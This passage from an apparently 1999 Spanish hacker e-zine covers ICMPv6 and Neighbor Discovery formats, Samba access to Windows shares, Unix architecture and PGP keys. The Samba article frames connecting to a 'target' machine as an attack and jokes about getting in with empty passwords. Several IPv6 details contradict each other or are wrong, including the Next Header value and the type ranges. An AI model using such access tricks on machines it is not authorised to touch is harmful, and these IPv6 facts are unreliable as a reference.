 Checksum: (Suma de control ICMPv6) 
 Reserved: 0 (Sin un valor asignado) 
 Target Address: Informa al host, de que hay un camino mejor por donde 
encaminar su trafico hacia su destino, indicandolo en este campo. 
 Destination Address:  Aqui informa el router al host, el destino del trafico 
al cual se refiere. 
 Options: 
-Target link-layer address 
Direccion de la capa de enlace del destino. Debe incluirse si es posible. En 
enlaces del tipo NBMA (non-broadcast multi-access), los host podria requerir 
la direccion de la capa de enlace del destino. 
-Redirected Header 
Incluir tanto como sea posible de la cabecera IP del paquete que ha probocado 
el envio del mensage. 
 
 
 
3.2.2 Formato del campo de opciones del ND. 
 
Dentro de los mensages anteriormente citados, el campo Options debe tener este 
formato: 
 
-Source/Target Link-layer Address 
 
	+---------------+---------------+---------------------------+ 
	|     Type      |    Length     |    Link-Layer Address ... | 
	+---------------+---------------+---------------------------+ 
 
Type: 
 1 Para el Source Link-layer Address 
 2 Para el Target Link-layer Address 
 
Length: Longitud, incluyendo el campo Type y Length medida en valores de 8 
bytes. 
 
Link-Layer Address:  
Direccion de la capa de enlace. Su formato esta a la espera de ser 
especificado. 
 
 
-Prefix Information 
 
	+---------------+---------------+---------------+-+-+-----------+ 
	|     Type      | Length	| Prefix Length |L|A| Reserved1 | 
	+---------------+---------------+---------------+-+-+-----------+ 
	|			Valid Lifetime				| 
	+---------------------------------------------------------------+ 
	|			 Preferred Lifetime			| 
	+---------------------------------------------------------------+ 
	|			    Reserved2				| 
	+---------------------------------------------------------------+ 
	+			  Prefix				+ 
	|                                                               | 
	+---------------------------------------------------------------+ 
 
Type: 3 
 
Length: 4 
 
Prefix Length: 8 bits de unsigned integer en un rango de 0 a 128 que indican 
las primeras posiciones del prefijo que son validas. 
 
L: Flag de on-link. Con valor 1, indica que la direccion es del tipo on-link, 
a 0, no especifica nada. 
 
A: Flag de autonomous address-configuration (configuracion autonoma de 
configuracion). Con valor 1, indica que el prefijo puede ser usado para que el 
host configure su direccion. 
 
Reserved1: Campo de 6 bits reservados para uso futuro. Se debe inicializar a 0. 
 
Valid Lifetime: Valor de 32 bits insigned integer, que informa del tiempo en 
segundos que el prefijo, a fines de direcciones on-link, debe ser valido. Si 
el campo son todos 1 (0xffffffff) el valor es infinito. 
 
Preferred Lifetime: Valor de 32 bits insigned integer, que indica el tiempo en 
segundos, que la direccion generada a partir del prefijo es preferible que sea 
usada. Si el campo son todos 1 (0xffffffff) el valor es infinito. 
 
Reserved2: Campo reservado para uso futuro. Se debe inicializar a 0. 
 
Prefix: Contiene una direccion IP o un prefijo IP. El campo Prefix Length 
contiene los bits primeros a tener en cuenta y el resto deben ser 
inicializados a 0 e ingnorados por el que envia el mensage. Un router no debe 
mandar prefijos hacia links locales y un host local, debe ignorarlo. 
 
 
-Redirected Header 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |    Length     |            Reserved           | 
	+---------------+---------------+-------------------------------+ 
	|                           Reserved                            | 
	+---------------+---------------+-------------------------------+ 
	|                                                               | 
	~			IP header + data 			~ 
	|                                                               | 
	+---------------------------------------------------------------+ 
 
Type: 4 
 
Length: longitud en unidades de 8 bytes de la opcion. 
 
Reserved: Campo reservado para futuros usos. Debe ser inicializado a 0. 
 
IP header + data: Paquete original truncando su tamaño para que, la longitud 
total, no exceda de 1280 bits. 
 
 
-MTU 
 
	+-------------+---------------+-------------------------------+ 
	|   Type      |    Length     |           Reserved            | 
	+-------------+---------------+-------------------------------+ 
	|                            MTU                              | 
	+-------------+---------------+-------------------------------+ 
 
Type: 5 
 
Length: 1 
 
Reserved: Campo reservado para futuros usos. Debe ser inicializado a 0. 
 
MTU: 32 bits unsigned integer que indica el MTU recomendado. El valor debe ser 
aplicado a todos los segmentos. 
 
 
 
Si algun campo de opciones es encontrado dentro de un tipo de mensage que no 
le corresponde, debe ser simplemente ignorado por el router. 
 
 
El Neighbor Discovery, es un protocolo tan extenso, que ocupa un RFC entero 
(el RFC 2461). Solo he querido tratarlo muy por encima, por lo que sugiero su 
lectura para mayor informacion. 
 
 
				|-------------------------------| 
 
4 ICMPv6 
 
El Internet Control Messages Protocol (56 en el campo de Next Header), tiene 
el mismo uso que su antepasado, el ICMPv4. La mision de un ICMP, es sobre todo 
la de informar. Sobre que informa, como y de que forma, lo tratare de explicar 
en las siguientes secciones. 
 
 
4.1  Tipos de ICMPv6 y formato 
 
Los mensages de ICMP, se han dividido en 2 clases, los que comunican errores, 
y los que piden/dan informacion sobre un nodo. Para diferenciarlos, se han 
adjudicado una numeracion del 0 al 127 a los mensages que contienen 
informacion y del 128 al 255, sobre los que informan de algun tipo de error de 
una peticion. 
 
Un paquete ICMPv6, esta formado por una cabecera IPv6, y es precedido 
inmediatamente por una cabecera con valor 58 en el campo next header: 
 
   +---------------+------------------------ 
   |  IPv6 header  | ICMP header + data 
   |               | 
   | Next Header = | 
   |      58       | 
   +---------------+------------------------ 
 
Notese, que este procedimiento es diferente al de IPv4, y que un ICMP puede 
ser insertado en cualquier tipo de paquetes. 
 
 
 
 
4.2 Tipos de ICMPv6 de informacion 
 
Los mensages de informacion, pueden ser del tipo: 
 
 Echo Request (Type 128) 
 
Un nodo, puede enviar un ICMP Echo Request (Mas conocidos como pings), para 
saber el tiempo de respuesta de otro host. 
 
El formato es el siguiente: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	|           Identifier          |        Sequence Number        | 
	+-------------------------------+-------------------------------+ 
	|     Data ...							| 
	+---------------------------------------------------------------+ 
 
 Type: 128 
 
 Code: 0 
 
 Checksum: Suma de control, para la comprobacion de la informacion. 
 
 Identifier: Identificador para contrastar los ICMP Echo Reply de respuesta. 
 
 Sequence Number: Secuencia de numeros, para contrastar los ICMP Echo Reply  
 de respuesta en orden. 
  
 Data: Datos aleatorios o ceros de relleno. 
 
La recepcion de ICMP Echo Request, debe ser comunicada a la capa superior de 
trasporte. 
 
Echo Reply (Type 129) 
 
El ICMP Echo Reply, es enviado como respuesta a un ICMP Echo Request. El ICMP 
Echo Reply debe ser trasportado al proceso que origino el ICMP Echo Request. 
 
Su formato es el siguiente: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	|           Identifier          |        Sequence Number        | 
	+-------------------------------+-------------------------------+ 
	|     Data ...							| 
	+---------------------------------------------------------------+ 
 
 Type: 129 
 
 Code: 0 
 
 Checksum: Suma de control, para la comprobacion de la informacion. 
 
 Identifier: Identificador que debe contrastar con los ICMP Echo request 
 que se han recibido. 
 
 Sequence Number: Secuencia de numeros, que debe contrastar con los ICMP Echo 
 request que se han recibido en el mismo orden. 
  
 Data: Datos aleatorios o ceros de relleno. 
 
 
 
4.3 Tipos de ICMPv6 de error 
 
 Destination Unreachable (Type 1) 
 
Un ICMP Destination Unreachable es mandado por un router, o por cualquier 
nodo, para informar de la imposibilidad de que un paquete lleje a su destino. 
NO se deberian mandar ICMPv6, si son ocasionados por problemas de congestion 
de la red. 
Estos ICMP se dividen en subclases, segun el tipo de problema que halla 
ocasionado su emision: 
 
-Si el error es ocasionado por un envio de un paquete al nodo erroneo, este 
enviara un ICMPv6 con codigo 0 
-Si el error es ocasionado por un envio hacia un destino cerrado por causas 
administrativas (Un firewall por ejemplo), se debe enviar un ICMP de codigo 1. 
-Si el error es ocasionado por la imposibilidad de resolver la direccion IP de 
un link, se enviara un ICMPv6 con codigo 3. 
-Si el error es ocasionado por un fallo en la capa de trasporte si el 
puerto esta indisponible para la misma se enviara un ICMP con codigo 4. Por 
ejemplo, un paquete TCP enviado a un puerto UDP. 
Un nodo que ha recibido un ICMPv6 Destination Unreachable, debe comunicarlo a 
la capa superior del proceso. 
 
El formato seria el siguiente: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	|                             Unused                            | 
	+---------------------------------------------------------------+ 
	|		La maxima cantidad posible de datos del		| 
	|		paquete originario del error, sin exceder	| 
	| 		el tamaño del MTU.			   	| 
	+---------------------------------------------------------------+ 
 
Type: 0 
 
Code:   0 - no route to destination 
	1 - communication with destination administratively prohibited 
	2 - (not assigned) 
	3 - address unreachable 
	4 - port unreachable 
 
Unused: Campo sin uso, que debe ser inicializado a 0 por el emisor e ignorado 
por el destino. 
 
Checksum: Suma de control, para la comprobacion de la informacion. 
 
 
 
 Packet Too Big (Type 2) 
 
Un ICMP Packet Too Big , es enviado cuando el tamaño maximo de un paquete es 
superior a la MTU del interfaz de red al que se ha enviado. Tambien es enviado 
por un router, si el siguiente salto es tiene un MTU inferior al tamaño del 
paquete. Este ICMP, puede ser usado para saber el MTU de un path. 
 
El formato seria el siguiente: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	|				 MTU				| 
	+---------------------------------------------------------------+ 
	|		La maxima cantidad posible de datos del		| 
	|		paquete originario del error, sin exceder	| 
	| 		el tamaño del MTU.			   	| 
	+---------------------------------------------------------------+ 
 
Type: 2 
 
Code: 0 (Inicializado a 0 por el origen, ignorado por el destino) 
 
Checksum: Suma de control, para la comprobacion de la informacion. 
 
MTU: MTU del siguiente salto. 
 
 
 
 Time Exceeded (Type 3) 
 
Si un router recive un paquete con el Hop limit a 0 o si es el quien 
lo tiene que poner a 0, el paquete es descartado y se envia un ICMPv6 Time 
Exceeded. Si un host, no puede ensamblar un paquete en un tiempo x, descartara 
todos los fragmentos recibidos y tambien enviara un ICMP de esta clase. 
La llegada de un ICMPv6, debe ser notificada a la capa superior de trasporte. 
 
El formato queda de esta forma: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	|				Unused				| 
	+---------------------------------------------------------------+ 
	|		La maxima cantidad posible de datos del		| 
	|		paquete originario del error, sin exceder	| 
	| 		el tamaño del MTU.			   	| 
	+---------------------------------------------------------------+ 
 
Type: 3 
Code: 0 - hop limit exceeded in transit (Rebasado el limite de saltos) 
      1 - fragment reassembly time exceeded (Rebasado el tiempo de  
          ensamblado en destino) 
 
Unused: Campo inicializado a 0 en origen, e ignorado por destino. 
 
Checksum: Suma de control, para la comprobacion de la informacion. 
 
 
 
 
 Parameter Problem (Type 4) 
 
Si un nodo IPv6, al procesar un paquete, encuantra un error en uno de los 
parametros de sus campos, enviara un ICMP Parameter Problem informando al 
destino de la situacion del error en el paquete. 
 
El formato quedaria asi: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	|				Pointer				| 
	+---------------------------------------------------------------+ 
	|		La maxima cantidad posible de datos del		| 
	|		paquete originario del error, sin exceder	| 
	| 		el tamaño del MTU.			   	| 
	+---------------------------------------------------------------+ 
 
Type: 4 
 
Code:   0 - erroneous header field encountered (Error en la cabecera) 
	1 - unrecognized Next Header type encountered (Numero de Next Header 
	    desconocido) 
 	2 - unrecognized IPv6 option encountered (Opcion desconocida en el 
	    paquete IPv6) 
 
Checksum: Suma de control, para la comprobacion de la informacion. 
 
Pointer: Contiene un offset, para la localizacion del parametro que origino el 
	 error. El offset, es el byte donde se encuentra el dato erroneo 
	 dentro del paquete. 
 
 
 
4.4 Seguridad e ICMPv6 
 
Los ataques producidos por los ICMP enviados de forma masiva, generalmente para 
provocar un DOS (Denial of Service) y/o la caida de un nodo de una red y/o de 
una conexion, son lo suficientemente conocidos como para no tener que volver a 
explicarlos. 
El protocolo IPv6, implementa medios de autentificacion que pueden evitar los 
mas comunes. 
 
-Caida por recepcion de envios masivos de ICMP. 
-Desconexion de un host, por el envio de un atacante al servidor, de ICMP con 
mensages de error. 
-Falsificacion de ICMP. 
 
Todos estos problemas, estan descritos en el RFC 2463, asi como sus posibles 
soluciones mediante aplicaciones de metodos autentificadores a niver de 
trasporte IP y/o mediante el chesum de control. 
 
 
 
				|-------------------------------| 
 
 
5 Links, bibliografia, etc... 
 
5.1 Links sobre IPv6 
 
*+* Url donde se centraliza IPv6 
 
http://www.ipv6.org 
 
http://dir.yahoo.com/Computers_and_Internet/Comunications_and_Networking/ 
 Protocols/IP/IPv6 
 
ftp://ftp.inria.fr/network/ipv6/netbsd 
 
ftp://ftp.inria.fr/network/ipv6/freebsd 
 
http://www.ipv6.nrl.navy.mil/ipv6+ipsec/ 
 
http://sunsite.cnlab-switch.ch/ 
 
http://www.redhat.com/mirrors/LPD/HOWTO/Net-HOWTO-6.html 
 
http://www.terra.net/ipv6/ 
 
http://playground.sun.com/pub/ipng/html/ipng-main.html 
 
ftp://ftp.kyoto.wide.ad.jp/IPv6/ 
 
http://www.research.microsoft.com/msripv6  (tnx zhodiac) 
 
ftp://ftp.kame.net./pub/kame/misc/ 
 
 5.2   Bibliografia. 
 
 
TCP/IP	*** Dr. Sidnie Feit 
 
TCP/IP Illustrated Vol 1 *** W. Richard Stevens (D.E.P) 
 
Computers Networks *** Andrews S. Tannembaum 
 
HOW-TO de Linux 
 
RFC: 
	2373 IP Version 6 Addressing Architecture 
	2462 IPv6 Stateless Address autoconfiguration 
	2461 Neighbor Discovery for IP Version 6 
	2460 Internet Protocol, Version 6 (IPv6) Specification 
	2463 Internet Control Message Protocol (ICMPv6) for the Internet 
	     Protocol Version 6 (IPv6) Specification 
	2454 IP Version 6 Management Information Base for the 
	     User Datagram Protocol 
	2553 Basic Socket Interface Extensions for IPv6 
	2543 6Bone Routing Practice 
	2529 Transmission of IPv6 over IPv4 Domains without Explicit Tunnels 
 
 
5.3   Agradecimientos y comentarios finales. 
 
En primer lugar a todos los de Undersec.com, mis amigos; a ABBA, la banda 
sonora de este doc ;), a todos los que me devolvieron la ilusion por lo que 
hacia, cuando se acercaba el precipicio y a microsoft, por que huyendo de su 
windows, me encontre con Linux, mi vicio actual (Por lo menos el mas 
confesable ;). 
 
Como comentario final, recomendaria que se leyera este doc como un apoyo 
solamente. Para una informacion mas profunda, se deben leer los rfc destinados 
a tal fin, y comentados en la seccion de bibliografia. 
Espero que hayas disfrutado leyendo. 
 
------------------------------------------------------------------------------- 
Septiembre de 1999 
http://www.undersec.com 
p0th@undersec.com 


=[01001b]=====================================================================
=[Samba]======================================================================
=[por IReick]=================================================================


AVISO IMPORTANTE


Este texto esta en echo para ser exclusivamente de contenidos educacionales,
esto es que sirve para aprender, para que el usuario adquiera conocimientos
sobre su sistema y pueda asegurarlo contra el ataque de gente no deseada ;o)


Asi que ya sabeis no es para ir por ahi jodiendo ordenadores y si lo haceis 
alla vosotros, el autor de este texto no se hace responsable de los actos del 
lector asi como de una perversa utilizacion de los contenidos que aqui se 
incluyen.


La tecnica desarrollada en este texto fue probada en un sistema Win98 con 
previo autorización y disposicionde lo que llamaremos maquina objetivo, lo 
que llamaremos ataque fue realizado desde un sistema linux corriendo RedHat 
6.0.


Bien, dicho esto pasemos a entrar en materia.


DALE CAÑAAAAAAAAAAAAA!!!!


Pues vamos alla. Seguro que muchos de vosotros estáis deseando saber como desde
nuestro querido sistema Linux podemos acceder a un sistema Windows (95.98 o NT)
,pues muy facil la respuesta esta en Samba (esta bien saberlo no practiralo ;o)
). Lo primero que hace el hacker en estos casos es encontrar una maquina 
objetivo lo sufucientemente interesante para entrar, teniendo en cuenta que 
todos estan muy preocupados intentando romper sistemas que corran UNIX, bien 
una vez seleccionada la maquina objetivo...(ahora paso yo a describir mi 
experiencia, REPITO CON PREVIA AUTORIZACION DEL HOST OBJETIVO) bien pues lo 
primero que se hace es abrirle una cuenta en mi sistema Linux, esto lo hacemos 
desde una xterm mediante el comando adduser o useradd (aqui lo que hacemos es 
abrirle una cuenta a nuestro objetivo en nuestro sistema Linux), el objetivo 
tiene una cuenta abierta en nuestro sistema de la cual no es conocedor (mi 
objetivo si era consciente de que iba a ser "atacado") y aunque llegase a 
averiguar que tiene una cuenta ya me direis de donde saca la contraseña ;o) .


Bien, pues una vez echo este primer paso y que no entraña ninguna dificultad 
se pasa a realizar una correcta configuracion de Samba.


Bien, para aquellos que no sepan demasiado del tema os dire que Samba es un 
conjunto de programas incluidos en un paquete que dejan a una maquina que corra
UNIX hacer de servidor, con el fin de intercambiar recursos ;o), para otros 
sistemas que utilizen el protocolo SMB. Consta principalmente de dos demonios 
que son smbd y nmbd.


Muy bien no me enrollo a explicar mas que es samba porque existen paginas de 
ayuda y no es el objetivo de este texto asi que venga, el siguiente paso, 
instalamos la version 1.9.18p10 (la probada en este artículo), en las versiones
mas actuales de linux ya viene instalado por defecto y si no pues lo instalais 
vosostros que no es tan dificil.


Muy bien una vez instalado lo que hemos de dejar que los demonios se "hagan 
notar", esto lo hacemos incluyendo a nuestro fichero intd.conf las siguientes 
lineas


netbios-ssn stream tcp nowait root /usr/sbin/smbd smbd

netbios -ns dgram udp wait root /usr/sbin/nmbd nmbd


Muy bien ahora vamos con el fichero de configuracion que consta de tres partes 
o secciones.El fichero se llama smb.conf, asi que nos vamos a la seccion global
y en la linea que nos dice

workgroup=MYGROUP

cambiamos MYGROUP por el grupo de trabajo al que nos queremos unir, en mi caso 
JODETE.

muy bien ahora nos vamos a la linea  

server string = Samba Server

y podemos cambiar Samba Server por lo que queremos pues es para reconocer el 
servidor en micaso

Esto es una prueba.


Sigamos, mas abajo nos encontramos con la linea 

security = user

esto quiere decir que cada personita tiene su password, y podemos modificarlo 
por tres tipos diferentes de seguridad

security = share 

security = server

security = user

vosotros vereis cual es la mas acertada ;o)

Tambien (es opcional) podeis añadir a la linea

netbios name = ??????

el nombre de nuestra maquina, en mi caso puese MPC, quedando la linea:

netbios name = MPC


Muy bien,ahora lo que vamos a hacer es configurar el demonio nmbd para que 
sistemas Win95 puedan acceder a nosotros asi que creamos un fichero lamado 
lmhosts (os suena ;o) )

en el que conste la direccion IP de nuestra maquina de forma

o.o.o.o MPC

nuestra ip sera esa, tranquilo, despues digamos que se asigna automaticamente,
no se quedara en 0.0.0. ;o)

en este mismo fichero incluiremos cuantas máqiunas queramos ya sabeis como va 
(acordarse del bug de recursos compartidos de win 95) :
ipdelamaquina nombredelamaquina.


BIen, pues ya hemos acabado la configuración, eso si no he incluido la 
configuracion de la seccion [homes]  donde configuramos las opciones de 
recursos compartidos, este es muy claro y lo podreis configurar a vuestro gusto
;o).


Vale, ahora que pues vamos a probar si funciona , asi que vamos alla, lo ideal 
es primero probar la configuracion con nosotros mismos.

Para hacerlo he utilizado smbclient (funciona como ftp)

asi que lo primero que hacemos es pedir una lista de recursos de la maquina 
objetivo esto lo hacemos de la siguiente manera desde xterm:

smbclient -L nombremáquinaobjetivo

Si nos lo muestra querra decir que esto chuta y que podemos acceptar conexiones
y conectarnos a otras maquinas ;o)

para conectarnos a una maquina hacemos

smbclient \\\\maquina\\nombre_del_recurso\\

recuerdo que aqui os puede pedir un password antes de acceder (any problem ;o) 
) pero vamos que eso es normal, un golpe de RETURN y sorpresa , ya hemos 
accedido al recurso.


Bueno pues ya esta, deciros que tambien podeis jugar un poquito con el archivo 
de configuracion de samba (smb.conf) pero cuidado porque os puede ocurrir que 
luego no os funcione la configuracion, pero eso se arregla restaurando los 
valores iniciales, pero aqui no nos vamos a adentrar en como hacer pijaditas 
con samba, asi que el que quiera saber mas, pues nada a golpe de manual ;o)


AGRADECIMIENTOS Y DESPEDIDA


Bien gente ya solo me falta despedirme y esperar que este texto os sirva para 
mucho (perono para hacer maldades ;o) )


Muy bien desde aqui quiero dar las gracias a Naveg que fue quien me dio la 
idea, sin el este texto no se hubiera realizado , tambien a Sensei, el cual 
tambien ha escrito un texto sobre el tema, asi que nada agradecimientos en 
especial a estas dos personas que podreis encontrar el canal #hacker_novatos de
irc hispano, (por alli tambien estoy yo) y saludar tambien a toda la gente del 
canal #hacker_novatos que son todos unos tios cojonudos.


Por ultimo decir que este texto es propiedad del autor , es decir, yo IReick, 
y me podeis mandar las dudas que os surgan sobre el texto a IReick@hotmail.com
, tambien decir que como propietario del texto solo doy permiso para copiar 
este texto SIEMPRE que en la reproduccion se incluyan estas lineas, asi que no 
me violeius el copyright ;o)


BUENO PUES NA ABUR Y HASTA OTRA 


=[01010b]=====================================================================
=[Arquitectura de sistemas *NIX]==============================================
=[por DarK FeaR]==============================================================


-Arquitectura de sistemas *NIX

Indice
------

1. Introduccion
2. Niveles del sistema
 2.1 Hardware
 2.2 Nucleo o kernel
  2.2.1 Traps
  2.2.2 Subsistema de ficheros
  2.2.3 Control de procesos
 2.3 Nivel usuario
3. Despedida


+----------------+
|1. Introduccion |
+----------------+


     Buenas. Como habreis visto ahora el curso de Pascal lo sigue Freed0m,
ya que asi se lo pedi porque queria dedicarme a un articulo en especial,
pero que al final no he podido hacer. Espero que para proximos numeros
pueda hacerlo ya que me gustaria aprender mas sobre ese tema, pero bueno, ya
veremos lo que sale ;). De momento, he decidido hacer este pequeño
articulillo sobre la arquitectura de los *nix, que seguramente amplie en el
proximo numero con el sistema de ficheros de UNIX. Todo se vera. Bueno me
dejo de rollos y al grano...


+-----------------------+
|2. Niveles del sistema |
+-----------------------+


     Un sistema *nix esta compuesto por diferentes niveles, que se pueden
dividir en tres:

- Nivel Hardware
- Nivel Kernel
- Nivel Usuario

     Cada uno de estos niveles esta intercomunicado con el innmediatamente
superior o inferior, pero no se puede saltar de un extremo a otro. Por
ejemplo, un usuario debe usar el kernel de intermediario para comunicarse
con el hardware, y viceversa. En el siguiente grafico ASCII podemos apreciar
la disposicion de los niveles.


        +-----------------------------------------------+
3->     |Programas estandar UNIX | Programas del usuario|
        +-----------------------------------------------+
2->     |                     KERNEL                    |
        +-----------------------------------------------+
1->     |                    HARDWARE                   |
        +-----------------------------------------------+


     Ahora veremos detalladamente cada uno de estos niveles, y en algun caso
sus subniveles.

--(2.1 Hardware)--->


     El nivel de hardware esta estrictamente formado por los componentes
fisicos del ordenador, por ejemplo, la pantalla, el raton o el teclado. Ya
veis que este nivel no tiene mucho que explicar. Para controlar el hardware
se hace uso del kernel, el cual veremos ahora.

--(2.2 Kernel)--->


     El kernel es digamos el cerebro del sistema operativo. Es un pequeño (y
a veces no tan pequeño) programa que se carga en memoria al inicializarse el
sistema y es el que gestiona el acceso al hardware por parte del usuario y
la respuesta de este.

     El kernel esta escrito en su mayor parte en lenguaje C (por algo es el
estandar ahora de todo *nix), conviviendo tambien con pequeñas partes de
codigo en ensamblador. Gracias a esto el sistema no depende de una maquina,
sino de una arquitectura. Por ejemplo, en el sistema Linux, la version para
PC es compatible con cualquier procesador que siga la compatibilidad
descendiente creada por Intel, es decir, que implemente las instrucciones de
cada procesador anterior (por ejemplo un pentium implementa las instrucciones
del 80386). Asi se puede comprobar que en las versiones PC de linux se indica
la palabra i386, y puede ser utilizado por cualquier procesador 80386 y
superior. Lo que no podremos hacer, por ejemplo, es instalar la version
Alpha en un PC, ya que la arquitectura es diferente.


--(2.2.1 Traps)--->


     Las traps son lo que en otros sistemas como el DOS se conocen como
interrupciones de software, y que no son mas que maneras de interactuar con
el hardware por medio del kernel. Las interrupciones se suelen activar como
por ejemplo un interruptor. Para el uso de las interrupciones se usan los
registros, que por si no habeis oido hablar de ellos (los que hayais
estudiado ensamblador fijo que lo sabeis ;) son, a groso modo, como variables
internas que estan cerca de la CPU y que, dependiendo del procesador tienen
unos tamaños. En los viejos ordenadores, anteriores al 80386, el tamaño de
los registros era de 16 bits divididos en dos partes de 8 bits (AH y AL,
High y Low). A partir de los 80386 se amplio el tamaño de los registros a 32
bits, creando los registros extendidos, EAX, EBX, etc. (cada uno de ellos
dividido igual que antes). Pues bien, explicado que son los registros,
continuemos con las interrupciones. La forma de usar las interrupciones,
como decia, es poniendo unos valores en los registros, generalmente en AX, y
entonces llamando a la interrupcion asociada con lo que queremos hacer. Esto
se hace con instrucciones en ensamblador como puede ser, por ejemplo:

mov ax,4c00h
int 21h

     Esta orden particularmente lo que haria seria meter en AH el valor 4c,
en AL el valor 00, y llamar a la interrupcion software 21. Todos estos
valores estan como se puede ver, en hexadecimal.

     Bueno, no nos extenderemos mas en esto puesto que no sera necesario
saber ensamblador para llamar a las interrupciones, puesto que hay una
libreria que hace eso por nosotros. Esta libreria generalmente se encuentra
en el directorio /lib o /usr/lib, y es el fichero libc.a. Pero no esta de
mas saber como funciona el rollo por dentro, no?.

     El encargado de gestionar el hardware es el control de hardware del
kernel, que es el que manejara las traps de las que hemos estado hablando y
la comunicacion con los dispositivos.


--(2.2.2 Subsistema de ficheros)--->


     El subsistema de ficheros se encarga de gestionar el sistema de
ficheros propiamente dicho, asi como reservar el espacio pertinente para
cada fichero, etc.

     Para comunicarse con los dispositivos de almacenamiento el sistema de
ficheros lo hace a traves de los manejadores de dispositivo. Estos hacen
posible la comunicacion entre el kernel y el hardware, a traves del
protocolo "handshake". Dependiendo de la forma de acceder a estos
dispositivos hardware, se los puede clasificar en dos grandes grupos:

- Dispositivos modo caracter
- Dispositivos modo bloque

     La diferencia entre estos dos radica en que los dispositivos de modo
bloque hacen uso de un bufer para traspasar datos, es decir, hacen servir un
espacio determinado (el tamaño del bufer) de puente antes de traspasar datos
al hardware. Esto mejora sensiblemente la velocidad. En los dispositivos a
los que se accede en modo caracter se hace de forma directa. Existen
dispositivos a los que se puede acceder de las dos formas indiferentemente.


--(2.2.3 Control de procesos)--->


     El control de procesos, al igual que el subsistema de ficheros, es un
tema que requiere una explicacion extensa. De todas formas intentare
explicar basicamente para que sirve y como funciona.

     Digamos que el control de procesos es una parte muy importante del
sistema, es la que gestiona la memoria que utiliza cada proceso, la
comunicacion entre estos, su planificacion, el swapping, etc. Vamos ahora a
ver separadamente las partes mas importantes del control de procesos.

     En primer lugar hablaremos de la gestion de memoria. Esta, como su
nombre indica, se encarga de los procesos que estan cargados en memoria en
tiempo real, es decir, en cada momento. Hay momentos (dependiendo de cada
sistema y su memoria) en que la memoria principal del ordenador se encuentra
'llena' de procesos y es incapaz de gestionar mas. En ese momento entra en
escena la memoria de intercambio. La memoria de intercambio es una zona del
disco duro, con sistema de particion propio. En el se almacenan los
programas cuyo tiempo de ejecucion ha terminado, para dejar espacio en la
memoria a los nuevos programas que la necesitan. El tiempo de ejecucion no
es mas que unos determinados instantes que tienen cada proceso para
ejecutarse. Este tiempo suele ser muy pequeño, asi es posible el concepto de
multitarea ya que estos programas se van ejecutando secuencialmente una vez
el tiempo de ejecucion del anterior ha expirado. El programa encargado de
decidir el tiempo de ejecucion de cada programa se denomina 'scheduler'. De la
misma forma, cuando el programa que se movio anteriormente a la zona de swap
necesita su tiempo de ejecucion, vuelve a tener nuevamente un hueco de memoria,
hueco que dejara, como antes, otro programa cuyo tiempo de ejecucion haya
acabado.


--(2.3 Nivel usuario)--->


     En este nivel nos encontramos con lo que normalmente identificamos con
el sistema, es decir, los programas. Este nivel lo podemos dividir a la vez
en dos subniveles muy parecidos, que son los programas estandares del
sistema, como los editores ed o vi, el compilador gcc, etc. y por otra parte
los programas del usuario, ya sea creados por el o por personas ajenas, como
por ejemplo mutt, netris o cualquiera que no sea un estandar en todos los
*NIX.


+-------------+
|3. Despedida |
+-------------+


     Bueno, como os he dicho no he pretendido hacer un articulo largo y
pesado, sino una pequeña explicacion de la arquitectura de un sistema.
Seguramente me haya dejado algo, asi que por ese motivo en proximo numero
seguramente, como he dicho al principio, haga una ampliacion, lo mas seguro
que de la seccion del sistema de archivos, o quizas del control de procesos,
quien sabe ;). Aprovecho para saludar a mis amigos, no hace falta decir
nombres, que siempre se suele olvidar alguno. Y como parece que ahora los
articulos llevan banda sonora (que no? mirad el arti de p0th xD), pues
saludos a Cradle of Filth, que me han amenizado la realizacion de este
articulo xDD. Venga, un saludete.


=[01011b]=====================================================================
=[Llaves PGP]=================================================================
=[por NetSearch]==============================================================

    Como es habitual aqui os van las llaves publicas de los autores de los
articulos de este numero. Os recordamos que la version internacional de PGP
se encuentra en http://www.pgpi.com. La alternativa a este y que cada vez
esta ganando mas adeptos entre los linuxeros es Gnu Privacy Guard, o
simplemente GPG. Esta disponible en http://www.gnupg.org. Escoged el que mas
os guste ;)

- Llave PGP de Posidon

<++> pgpkeys/posidon.asc $a1ff9a1bc42b14713f294d79ac2288a8
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3i

mQENAzXrEhAAAAEIAMpdf1Cp68n09E9D1J7E0XyDRFLg5m3W+Q/kGScRndBAcXRP
o6lUbdhA6JV9UJIpQsg0GoHTdLMcid3oLMnQLw7YD3d0hcN0tMCMmoc9wxm3cZFO
RNoEUz5wIGt52j3yJWa7mK26V4+xIeWc346p/pnzRRDj6VLUO2xCwmIKP7/tcyce
zfdYIwewTnVkaArRiO/EfIrp03AMf7WOb9RcKVtKeqywi+CLh5Jxtr1KT2abJRG5
iRdElDhQaL0y4wUUKuf0IwaIOOyGlHOjWpZxF59Lh8YmNXACa/RO7sSHtMc2flp/
G384N7LIz53n+7a3YMq/9++L5I9wU+O7NqidbYUABRG0DmhhY2tlcl9ub3ZhdG9z
=c9kj
-----END PGP PUBLIC KEY BLOCK-----
<-->

- Llave PGP de ulandron
<++> pgpkeys/ulandron.asc $6ae6fb5b54babddb28aab412b2e1bccd
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v0.9.3 (GNU/Linux)
Comment: Ulandron, verify key at www.pgp.net

mQGiBDacgekRBACfpPhY+hhtthnfjkRVXG2Gl9S9rUoEajmQ+Lf+x2AyS9/xrtPl
1UeZjm6NzdMCo+kf1JxgFUfPn7m1zlScY7yy3X9nF0w6rHqtnXS0qc289rUVmELD
cJy/JmT4DlpBEmUPPk+ET+8rExpRO7xA6HoR4ZgVWQdGX3YeKmcyd2NGVwCgqIKb
kHUXSn6qd0rJuDO193CFP9cD/12xKESoTdSZMP3l8p0yA7/5szlCogGfBH1OjZAV
